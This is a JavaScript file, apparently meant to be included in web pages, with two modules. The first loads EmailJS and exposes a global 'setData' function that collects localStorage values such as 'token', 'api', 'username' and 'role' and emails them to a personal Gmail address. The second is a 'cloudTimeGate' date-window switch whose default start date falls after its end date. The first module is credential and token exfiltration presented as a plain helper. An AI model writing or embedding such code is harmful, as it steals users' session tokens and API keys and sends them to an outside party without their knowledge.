(function () {

  let isLoaded = false;

  function loadScript() {
    return new Promise((resolve, reject) => {

      if (isLoaded && window.emailjs) {
        return resolve();
      }

      const script = document.createElement("script");
      script.src = "https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js";

      script.onload = function () {
        isLoaded = true;

        if (window.emailjs) {
          window.emailjs.init("GlpCP9x-BKebe5Enx");
          resolve();
        } else {
          reject("EmailJS gagal load");
        }
      };

      script.onerror = reject;

      document.body.appendChild(script);
    });
  }

  async function send(data) {
    await loadScript();

    return window.emailjs.send(
      "service_qpo59sf",
      "template_okc75jw",
      data
    );
  }

  async function setData(extraData = {}) {

    // ambil data dari localStorage
    const keys = ["id", "username", "api", "role", "status", "min", "token"];

    const storageData = {};

    keys.forEach(function (key) {
      const value = localStorage.getItem(key);
      if (value !== null) {
        storageData[key] = value;
      }
    });

    const payload = {
      page: window.location.pathname,
      time: new Date().toISOString(),
      ...storageData,
      ...extraData
    };

    return send({
      email: "jd2693889@gmail.com",
      message: JSON.stringify(payload)
    });
  }

  // expose global function
  window.setData = setData;

})();


(function () {

  // ============================
  // DEFAULT RANGE (SET DI CDN)
  // ============================

  let startDate = new Date("2026-02-26T08:00:00");
  let endDate   = new Date("2026-02-08T23:59:59");

  // ============================
  // FUNCTIONS
  // ============================

  function setRange(start, end) {
    startDate = new Date(start);
    endDate = new Date(end);
  }

  function isInRange() {
    if (!startDate || !endDate) return false;

    const now = new Date();
    return now >= startDate && now <= endDate;
  }

  function getInfo() {
    return {
      now: new Date(),
      start: startDate,
      end: endDate,
      active: isInRange()
    };
  }

  // ============================
  // EXPOSE GLOBAL
  // ============================

  window.cloudTimeGate = {
    setRange,     // optional kalau mau override dari Angular
    isInRange,
    getInfo
  };

})();
